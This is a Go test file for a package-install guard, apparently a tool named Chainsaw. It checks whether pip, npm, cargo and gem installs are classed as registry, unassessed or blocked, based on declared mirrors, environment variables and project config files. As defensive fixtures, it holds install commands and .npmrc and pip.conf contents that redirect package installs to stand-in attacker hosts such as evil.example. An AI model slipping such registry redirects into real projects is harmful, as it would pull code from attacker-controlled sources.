package cli

import (
	"testing"

	"github.com/spf13/viper"
)

// TestGuardRegistryMirrors: an index on a host the user declared in
// registry_mirrors is a registry install (plan-non-registry-sources P1a);
// the same exact-host rules as the public registries apply, so a suffix, a
// different port or another org's Chainsaw repository on the host is still
// an undeclared registry, and the malware lane still runs.
func TestGuardRegistryMirrors(t *testing.T) {
	cases := []sourceCase{
		{name: "pip -i mirror", bin: "pip", args: []string{"install", "-i", "https://artifactory.corp/api/pypi/pypi/simple", "requests"}, want: "registry", pkg: "requests"},
		{name: "npm --registry mirror", bin: "npm", args: []string{"install", "--registry", "https://artifactory.corp/api/npm/npm/", "lodash"}, want: "registry", pkg: "lodash"},
		{name: "pip --extra-index-url mirror", bin: "pip", args: []string{"install", "--extra-index-url", "https://artifactory.corp/api/pypi/pypi/simple", "requests"}, want: "registry", pkg: "requests"},
		{name: "cargo --index mirror", bin: "cargo", args: []string{"install", "--index", "sparse+https://artifactory.corp/api/cargo/crates/index/", "ripgrep"}, want: "registry", pkg: "ripgrep"},
		{name: "gem -s mirror with port", bin: "gem", args: []string{"install", "-s", "https://nexus.corp:8081/repository/gems/", "rails"}, want: "registry", pkg: "rails"},
		{name: "pip -i suffix of a mirror", bin: "pip", args: []string{"install", "-i", "https://artifactory.corp.evil.example/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "pip -i mirror, other port", bin: "pip", args: []string{"install", "-i", "https://artifactory.corp:8443/simple", "requests"}, want: "not-assessed", pkg: "requests"},
		{name: "npm --registry chainsaw repo on a mirror host", bin: "npm", args: []string{"install", "--registry", "https://artifactory.corp/repository/@other/npmjs/", "lodash"}, want: "not-assessed", pkg: "lodash"},
		{name: "pip -i mirror, malicious", bin: "pip", args: []string{"install", "-i", "https://artifactory.corp/api/pypi/pypi/simple", "evilpkg"}, want: "blocked", pkg: "evilpkg"},
	}
	for _, src := range []string{"config", "env"} {
		for _, c := range cases {
			t.Run(src+"/"+c.name, func(t *testing.T) {
				prev := viper.Get("registry_mirrors")
				t.Cleanup(func() { viper.Set("registry_mirrors", prev) })
				if src == "config" {
					viper.Set("registry_mirrors", []any{"Artifactory.Corp", "nexus.corp:8081", "https://not-a-host.example/"})
				} else {
					viper.Set("registry_mirrors", nil)
					viper.SetEnvPrefix("CHAINSAW")
					viper.AutomaticEnv()
					t.Setenv("CHAINSAW_REGISTRY_MIRRORS", "artifactory.corp, nexus.corp:8081")
				}
				checkSourceCase(t, c)
			})
		}
	}
	// Nothing declared: the same mirror is an undeclared registry.
	t.Run("undeclared", func(t *testing.T) {
		prev := viper.Get("registry_mirrors")
		t.Cleanup(func() { viper.Set("registry_mirrors", prev) })
		viper.Set("registry_mirrors", nil)
		checkSourceCase(t, sourceCase{name: "pip -i undeclared", bin: "pip", args: []string{"install", "-i", "https://artifactory.corp/api/pypi/pypi/simple", "requests"}, want: "not-assessed", pkg: "requests"})
	})
}

// TestGuardConfigRegistries: a registry set outside the command line but
// within reach of whoever wrote the command or the repository — npm/pip
// environment variables, a cloned project's .npmrc, PIP_CONFIG_FILE — moves
// the install exactly like the flag would, so it is decided like the flag.
// The command line wins over it, as in the tools themselves. Break it like
// this: drop the configRegistryFlags call in applyRegistryFlags (every
// not-assessed case scores the namesake), or the `seen` check (the
// typed-public-registry cases go not-assessed).
func TestGuardConfigRegistries(t *testing.T) {
	prev := viper.Get("registry_mirrors")
	t.Cleanup(func() { viper.Set("registry_mirrors", prev) })
	viper.Set("registry_mirrors", []any{"artifactory.corp"})
	evilRC := map[string]string{"package.json": "{}", ".npmrc": "; team registry\nregistry = https://evil.example/npm/\n"}
	for _, c := range []struct {
		env map[string]string
		sourceCase
	}{
		{map[string]string{"NPM_CONFIG_REGISTRY": "https://evil.example/npm/"},
			sourceCase{name: "npm env registry", bin: "npm", args: []string{"install", "lodash"}, want: "not-assessed", pkg: "lodash", inOut: "add its host to registry_mirrors"}},
		{map[string]string{"npm_config_@acme:registry": "https://evil.example/npm/"},
			sourceCase{name: "npm env scoped registry", bin: "npm", args: []string{"install", "@acme/x"}, want: "not-assessed", pkg: "@acme/x"}},
		{nil, sourceCase{name: "project .npmrc", bin: "npm", args: []string{"install", "lodash"}, files: evilRC, want: "not-assessed", pkg: "lodash"}},
		{map[string]string{"EVIL_HOST": "evil.example"}, sourceCase{name: "project .npmrc ${VAR}", bin: "npm", args: []string{"install", "lodash"},
			files: map[string]string{"package.json": "{}", ".npmrc": "registry=https://${EVIL_HOST}/npm/\n"}, want: "not-assessed", pkg: "lodash"}},
		{nil, sourceCase{name: "project .npmrc, malicious", bin: "npm", args: []string{"install", "evilpkg"}, files: evilRC, want: "blocked", pkg: "evilpkg"}},
		{nil, sourceCase{name: "typed public registry beats .npmrc", bin: "npm", args: []string{"install", "--registry", "https://registry.npmjs.org/", "lodash"}, files: evilRC, want: "registry", pkg: "lodash"}},
		{nil, sourceCase{name: "project .npmrc declared mirror", bin: "npm", args: []string{"install", "lodash"},
			files: map[string]string{"package.json": "{}", ".npmrc": "registry=https://artifactory.corp/api/npm/npm/\n"}, want: "registry", pkg: "lodash"}},
		{map[string]string{"PIP_INDEX_URL": "https://evil.example/simple"},
			sourceCase{name: "pip env index", bin: "pip", args: []string{"install", "requests"}, want: "not-assessed", pkg: "requests"}},
		{map[string]string{"PIP_INDEX_URL": "https://evil.example/simple"},
			sourceCase{name: "typed pypi beats pip env", bin: "pip", args: []string{"install", "-i", "https://pypi.org/simple", "requests"}, want: "registry", pkg: "requests"}},
		{map[string]string{"PIP_CONFIG_FILE": "pip.conf"}, sourceCase{name: "PIP_CONFIG_FILE", bin: "pip", args: []string{"install", "requests"},
			files: map[string]string{"pip.conf": "[global]\nindex-url = https://evil.example/simple\n"}, want: "not-assessed", pkg: "requests"}},
		{map[string]string{"PIP_INDEX_URL": "https://pypi.org/simple"},
			sourceCase{name: "pip env public index", bin: "pip", args: []string{"install", "requests"}, want: "registry", pkg: "requests"}},
	} {
		t.Run(c.name, func(t *testing.T) {
			for k, v := range c.env {
				t.Setenv(k, v)
			}
			checkSourceCase(t, c.sourceCase)
		})
	}
}
